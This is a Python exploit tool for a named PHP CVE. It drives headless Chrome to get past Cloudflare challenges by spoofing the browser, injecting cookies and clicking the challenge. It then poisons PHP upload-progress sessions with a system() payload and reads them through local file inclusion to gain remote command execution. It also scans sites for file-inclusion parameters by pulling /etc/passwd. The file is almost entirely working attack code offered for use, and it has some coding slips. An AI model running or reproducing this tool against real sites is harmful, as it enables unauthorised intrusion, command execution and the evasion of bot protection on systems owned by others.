#!/usr/bin/env python3
"""php2shell in-browser runner (CVE-2026-109618/9).

The exploit executes INSIDE headless Chrome via CDP, so Cloudflare sees a
real browser: TLS/JA3, cookie jar, streaming fetch. Session poison uses a
ReadableStream request body (phase1 -> >min_freq stall -> phase2), then the
LFI reads the poisoned session file while the upload is in flight.

Usage:
  bx.py <url> [--probe] [--param page] [--cmd id] [--rounds 8]
"""
import json
import random
import string
import sys
import time
import urllib.request

import websocket

CHROME_PORT = 9225
CHROME_NAMES = ("google-chrome", "google-chrome-stable", "chromium",
                "chromium-browser", "chrome")


def CHROME_BIN():
    for n in CHROME_NAMES:
        p = shutil.which(n)
        if p:
            return p
    return ""
BASE = "http://127.0.0.1:%d" % CHROME_PORT
REAL_UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
           "(KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36")

PATHS = ["/var/lib/php/sessions/sess_{sid}", "/tmp/sess_{sid}",
         "/var/lib/php5/sess_{sid}", "/var/lib/php/session/sess_{sid}",
         "/var/tmp/sess_{sid}", "/usr/local/lib/php/sessions/sess_{sid}",
         "/var/tmp/php_sessions/sess_{sid}", "/var/lib/php/sessions/sess_{sid}"]


class CDP:
    def __init__(self, base=None):
        self.base = base or BASE
        self.ws = None
        self.n = 0

    def connect(self):
        for _ in range(25):
            try:
                tabs = json.load(urllib.request.urlopen(self.base + "/json/list"))
                for t in tabs:
                    if t.get("type") == "page":
                        self.ws = websocket.create_connection(
                            t["webSocketDebuggerUrl"], timeout=45)
                        return
            except Exception:
                pass
            time.sleep(0.4)
        raise RuntimeError("no chrome tab")

    def cmd(self, method, params=None):
        self.n += 1
        self.ws.send(json.dumps({"id": self.n, "method": method,
                                 "params": params or {}}))
        while True:
            m = json.loads(self.ws.recv())
            if m.get("id") == self.n:
                return m.get("result", m)

    def ev(self, js, timeoutms=20000):
        r = self.cmd("Runtime.evaluate",
                     {"expression": js, "returnByValue": True,
                      "awaitPromise": True, "timeout": timeoutms})
        if "exceptionDetails" in r:
            d = r["exceptionDetails"]
            ex = d.get("exception") or {}
            raise SystemExit("JS error: %s %s" % (d.get("text"), (ex.get("description") or "")[:300]))
        return r.get("result", {}).get("value")


def has_cf(c, url):
    try:
        r = c.cmd("Network.getCookies", {"urls": [url]})
        return any(x["name"] == "cf_clearance" for x in r.get("cookies", []))
    except Exception:
        return False


def setup(c, url):
    c.cmd("Network.enable")
    import os as _os
    cookie = _os.environ.get("P2S_CF_COOKIE", "")
    proxy = _os.environ.get("P2S_PROXY", "")
    if not cookie and _os.environ.get("P2S_SOLVER") and proxy:
        try:
            import solvercf
            sol = solvercf.solve(url, "cookie", proxy)
            if sol.get("ok"):
                cookie = (sol.get("cookie") or "").split("cf_clearance=", 1)[-1].split(";", 1)[0]
                ua = sol.get("ua")
                if ua:
                    c.cmd("Emulation.setUserAgentOverride", {"userAgent": ua})
        except BaseException:      # SystemExit from solvercf when no key is set
            pass
    if cookie:
        host = url.split("://", 1)[-1].split("/")[0]
        c.cmd("Network.setCookie", {"name": "cf_clearance", "value": cookie,
                                    "domain": host, "path": "/", "secure": True,
                                    "httpOnly": True, "sameSite": "None"})
    c.cmd("Page.enable")
    c.cmd("Emulation.setUserAgentOverride",
          {"userAgent": REAL_UA, "acceptLanguage": "en-GB,en;q=0.9",
           "platform": "Linux x86_64"})
    c.cmd("Page.navigate", {"url": url})
    time.sleep(1.5)
    # no challenge? done
    if c.ev("!/Just a moment/i.test(document.title) && document.readyState === 'complete'") is True:
        return True
    # pass CF challenge if present
    for i in range(25):
        if has_cf(c, url):
            return True
        rect = c.ev("""(function(){var f=document.querySelector('iframe');
            if(!f) return null; var r=f.getBoundingClientRect();
            return [r.x+r.width/2, r.y+r.height/2];})()""")
        if rect and i % 3 == 0:
            for t in ("mousePressed", "mouseReleased"):
                c.cmd("Input.dispatchMouseEvent",
                      {"type": t, "x": rect[0], "y": rect[1],
                       "button": "left", "clickCount": 1})
        time.sleep(1)
    return has_cf(c, url)


PROBE_JS = r"""
(async () => {
  const r = { php: false, phpver: "", cookie: false, blocked: false, status: 0 };
  try {
    const resp = await fetch(location.href, { cache: 'no-store' });
    const t = await resp.text();
    r.status = resp.status;
    if (/just a moment|cf-mitigated|attention required/i.test(t) || resp.status === 403 || resp.status === 429) {
      r.blocked = true;
    }
    const h = [...resp.headers].map(x => x.join(': ')).join('\n').toLowerCase();
    r.php = /x-powered-by:\s*php|phpsessid/i.test(h) || /session\.upload_progress|php\s*version/i.test(t);
    const m = (h + t).match(/php[\/ ]?(\d+\.\d+\.\d+)/i);
    if (m) r.phpver = m[1];
    r.cookie = /PHPSESSID/.test(document.cookie);
    if (!r.php) {
      const px = await fetch(location.pathname + (location.search ? '&' : '?') + 'x=1', { cache: 'no-store' });
      const t2 = await px.text();
      if (/x-powered-by|PHP\/|session\.upload_progress/i.test([...px.headers].map(x => x.join(':')).join(',') + t2)) r.php = true;
    }
    if (!r.php) {
      // behavioural: a PHP host with upload_progress on answers a progress POST
      // with Set-Cookie: PHPSESSID (the handler starts the session pre-script).
      try {
        const fd = new FormData();
        fd.append('PHP_SESSION_UPLOAD_PROGRESS', 'x');
        fd.append('f', new Blob(['A']), 'a.txt');
        const r3 = await fetch(location.pathname, { method: 'POST', body: fd, cache: 'no-store' });
        const hs = [...r3.headers].map(x => x.join(': ')).join('\n').toLowerCase();
        const t3 = await r3.text();
        if (/set-cookie:[^\n]*phpsessid/.test(hs) || /upload_progress_/.test(t3)) { r.php = true; r.progress = true; }
      } catch (e) {}
    }
  } catch (e) { r.error = String(e).slice(0, 80); }
  return JSON.stringify(r);
})()
"""

ATTEMPT_JS = r"""
(async () => {
  const SID = %s, CMD = %s, PARAM = %s, PATHS = %s, READ = %s;
  const r = { out: null, reason: "", session: 0 };
  document.cookie = 'PHPSESSID=' + SID + '; path=/';
  const sleep = ms => new Promise(x => setTimeout(x, ms));
  const bd = '----p2s' + Math.random().toString(16).slice(2);
  const enc = new TextEncoder();
  const probe = async () => {
    let best = 0, found = null;
    for (const p of PATHS) {
      try {
        const url = (READ || location.pathname) + '?' + PARAM + '=' + encodeURIComponent(p.replace('{sid}', SID));
        const resp = await fetch(url, { cache: 'no-store' });
        const t = await resp.text();
        if (t.length > best) best = t.length;
        const m = t.match(/uid=\d+\([^)]*\)[^<\n]*|root:[^:]*:0:0:[^<\n]*/);
        if (m && m[0].length > 4) { found = m[0]; break; }
      } catch (e) {}
    }
    r.session = best;
    return found;
  };
  const p1 = '--' + bd + '\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + SID +
    '\r\n--' + bd + '\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD\r\n PROGRESS"\r\n\r\n' +
    '<?php system("' + CMD + '");?>' +
    '\r\n--' + bd + '\r\nContent-Disposition: form-data; name="f"; filename="a"\r\n\r\n' + 'A'.repeat(5200);
  const p2 = 'A'.repeat(120000) + '\r\n--' + bd + '--\r\n';
  let ctrl;
  const waiters = [];
  const send = (bytes) => { try { ctrl.enqueue(bytes); } catch (e) {} const w = waiters.shift(); if (w) w(); };
  const stream = new ReadableStream({
    start(c) { ctrl = c; },
    pull() { return new Promise(res => waiters.push(res)); }
  });
  const total = enc.encode(p1).length + enc.encode(p2).length;
  const up = fetch(location.href, { method: 'POST', duplex: 'half', cache: 'no-store',
    headers: { 'Content-Type': 'multipart/form-data; boundary=' + bd, 'Content-Length': String(total) },
    body: stream }).catch(e => e);
  send(enc.encode(p1));
  await sleep(1350);
  try { send(enc.encode(p2)); ctrl.close(); } catch (e) {}
  try { await up; } catch (e) {}
  for (let i = 0; i < 14 && !r.out; i++) { r.out = await probe(); if (!r.out) await sleep(200); }
  return JSON.stringify(r);
})()
"""


def main():
    a = sys.argv[1:]
    if not a:
        print(__doc__)
        return
    url = a[0]
    probe = "--probe" in a
    param = a[a.index("--param") + 1] if "--param" in a else "page"
    cmd = a[a.index("--cmd") + 1] if "--cmd" in a else "id"
    rounds = int(a[a.index("--rounds") + 1]) if "--rounds" in a else 8

    c = CDP()
    c.connect()
    if not setup(c, url):
        print("challenge not passed")
        sys.exit(3)
    print("title:", c.ev("document.title"), flush=True)

    if probe:
        print("probe:", c.ev(PROBE_JS))
        return

    for i in range(1, rounds + 1):
        sid = "".join(random.choice("0123456789abcdef") for _ in range(32))
        try:
            out = c.ev(ATTEMPT_JS % (json.dumps(sid), json.dumps(cmd),
                                     json.dumps(param), json.dumps(PATHS)), 40000)
        except SystemExit as e:
            out = "JSERR %s" % e
        print("round %d sid=%s out=%r" % (i, sid, out), flush=True)
        if out:
            print("RCE:", out)
            return
    print("no output")


if __name__ == "__main__":
    main()


def ensure_chrome(port_num=None):
    """Start headless Chrome for a pool port if not already there."""
    import os, shutil, subprocess
    port_num = port_num or CHROME_PORT
    base = "http://127.0.0.1:%d" % port_num
    probe = "curl -s -o /dev/null -m 2 %s/json/version" % base
    if subprocess.run(probe, shell=True).returncode == 0:
        return True
    if not CHROME_BIN():
        return False
    prof = "/tmp/p2s-chrome-%d" % port_num
    shutil.rmtree(prof, ignore_errors=True)
    env = dict(os.environ, TMPDIR="/tmp")
    subprocess.Popen(
        [CHROME_BIN(), "--headless=new", "--no-sandbox", "--disable-gpu",
         "--disable-dev-shm-usageutime=0" if False else "--disable-dev-shm-usage",
         "--ignore-certificate-errors", "--remote-debugging-port=%d" % port_num,
         "--remote-allow-origins=*", "--user-data-dir=" + prof, "about:blank"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        env=env, start_new_session=True)
    for _ in range(40):
        if subprocess.run(probe, shell=True).returncode == 0:
            return True
        time.sleep(0.3)
    return False


WORDS = """page p inc include file files fil view load nav section content url doc path goto to tpl template lang
module route screen show display read dir folder action cat category item product id pid pg pagename pagenum
name area sub subpage r rp ref site src source dirname folder viewfile filename pathname php include_path
redirect next ret return back dest destination target link href param q query s search term keyword
tab tabname panel part block comp component widget mod mode op option pageid parent post preview print
redir rel reset res resource root sec sel select step style switch template_name theme tmp type
view name page_name pg name_of_page pagefile filepath d doc docname document section_id sid skin
start subitem title templatefile view_name visual cfg config conf opage open ourpage pageID page_id
pgid pname pno pnum pos prev sectionid""".split()
SCAN_TARGETS = ["/etc/hostname", "../../../../../../etc/hostname", "../../../../../../etc/passwd"]
SCAN_HOST_RE = r"^(?:ip-|ec2-|[a-z0-9][a-z0-9-]{4,}[a-z0-9])$|^[0-9a-f]{8,}$"
SCAN_PW_RE = r"root:[^:]*:0:0:"

SCAN_JS = r"""
(async () => {
  const PAGES = %s, WORDS = %s, HOSTRE = new RegExp(%s, 'm'), PWRE = new RegExp(%s), TARGETS = %s;
  const get = async (u) => {
    try {
      const r = await fetch(u, { cache: 'no-store' });
      if (r.status === 429) { await new Promise(x => setTimeout(x, 1400)); return get(u); }
      const t = await r.text();
      return { status: r.status, len: t.length, text: t };
    } catch (e) { return { status: 0, len: 0, text: '' }; }
  };
  const rand = () => Math.random().toString(36).slice(2, 12);
  const out = [];
  for (const page of PAGES) {
    const sep = page.includes('?') ? '&' : '?';
    const base = await get(page);
    if (!base.status) continue;
    const found = [];
    // -- Arjun-style discovery: which params change the response at all?
    for (const word of WORDS) {
      const r = await get(page + sep + word + '=1');
      if (!r.status) continue;
      const delta = Math.abs(r.len - base.len) / (base.len || 1);
      if (r.status !== base.status || delta > 0.004) found.push(word);
      if (found.length >= 18) break;
    }
    // -- LFI probe on the discovered params only
    for (const p of found) {
      let score = 1; const why = ['param-live'];
      const nope = await get(page + sep + p + '=zz' + rand());
      if (nope.status !== base.status) { score += 1; why.push('status ' + base.status + '->' + nope.status); }
      if (/failed to open stream|no such file|include\(|warning:/i.test(nope.text)) { score += 2; why.push('include-warning'); }
      for (const t of TARGETS) {
        const r = await get(page + sep + p + '=' + encodeURIComponent(t));
        if (PWRE.test(r.text)) { score += 5; why.push('PASSWD'); break; }
        if (HOSTRE.test(r.text) && r.status === 200 && r.len > 0 && r.len < 8000) { score += 4; why.push('READ ' + t); break; }
      }
      out.push({ page: page, param: p, score: score, why: why });
    }
  }
  out.sort((a, b) => b.score - a.score);
  return JSON.stringify(out.slice(0, 40));
})()
"""


def scan_page(c, url, params=None, paths=None, crawl=True):
    """Scan a target for LFI params: crawls same-origin links one level when
    crawl=True (default), then tests params on the seeds. Returns list."""
    words = params or WORDS
    base = "/" + (url.split("://", 1)[1].split("/", 1)[1] if url.split("://", 1)[1].count("/") else "")
    links = c.ev(r"""(async () => {
      const set = new Set();
      document.querySelectorAll('a[href]').forEach(a => set.add(a.href));
      document.querySelectorAll('form[action]').forEach(f => set.add(f.action));
      return [...set].filter(u => { try { return new URL(u).origin === location.origin; } catch (e) { return false; } })
        .map(u => { const x = new URL(u); return x.pathname + (x.search || ''); }).slice(0, 12);
    })()""") or []
    pages, seen = [], set()
    seeds = [base] + [l for l in links if isinstance(l, str) and l.startswith("/")] if crawl else [base]
    for p in (paths if paths is not None else seeds):
        p = p if p.startswith("/") else "/" + p
        if p not in seen:
            seen.add(p)
            pages.append(p)
    res = c.ev(SCAN_JS % (json.dumps(pages[:3]), json.dumps(words[:80]),
                          json.dumps(SCAN_HOST_RE),
                          json.dumps(SCAN_PW_RE), json.dumps(SCAN_TARGETS)),
               240000)
    try:
        return json.loads(res) if res else []
    except TypeError:
        return []


POOL = [9225, 9226]
_pool_rr = [0]


def port():
    _pool_rr[0] = (_pool_rr[0] + 1) % len(POOL)
    return POOL[_pool_rr[0]]


def attempt(c, url, cmd, param, read="", rounds=6, on_round=None):
    """Try to execute cmd. Returns (out, reason, session_len)."""
    import random as _r
    best_reason, best_session = "", 0
    for i in range(rounds):
        sidutime = 0
        sid = "".join(_r.choice("0123456789abcdef") for _ in range(32))
        try:
            raw = c.ev(ATTEMPT_JS % (json.dumps(sid), json.dumps(cmd), json.dumps(param),
                                     json.dumps(PATHS), json.dumps(read)), 45000)
            res = json.loads(raw) if raw else {}
        except SystemExit:
            return None, "scan error (js)", best_session
        session = int(res.get("session") or 0)
        best_session = max(best_session, session)
        if res.get("out"):
            return res["out"], "shell!", session
        best_reason = "session not written" if session == 0 else "no shell output (patched?)"
        if on_round:
            on_round(i + 1, rounds, best_reason)
    return None, best_reason or "no shell output", best_session
